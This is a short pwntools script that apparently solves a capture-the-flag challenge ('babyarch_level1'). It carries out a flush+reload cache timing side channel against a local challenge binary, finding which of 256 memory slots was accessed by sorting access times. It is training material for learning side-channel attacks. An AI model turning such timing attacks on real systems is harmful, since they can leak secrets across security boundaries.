# access all memory to make them "real" -> flush all the cache -> randonly access one of them (so that it will be in cache again) -> access all of them and count the time lapse -> the small one should be the one that was being accessed

from pwn import *

p = process("/challenge/babyarch_level1")

def get_timing(line):
    return int(line.split('in ')[1].split(' cycles')[0])

for i in range(256):
    p.sendline(f'read_to_mem {i}')
    p.sendline(b'a')

p.sendline(b"flush_cachelines")
p.sendline(b"access_random")

p.clean()
p.sendline(b"time_accesses")

res = p.recvuntil(b"quit").decode().split('\n')[1:-1]
res.sort(key = get_timing)
print(len(res))
for r in res:
    print(r)
p.interactive()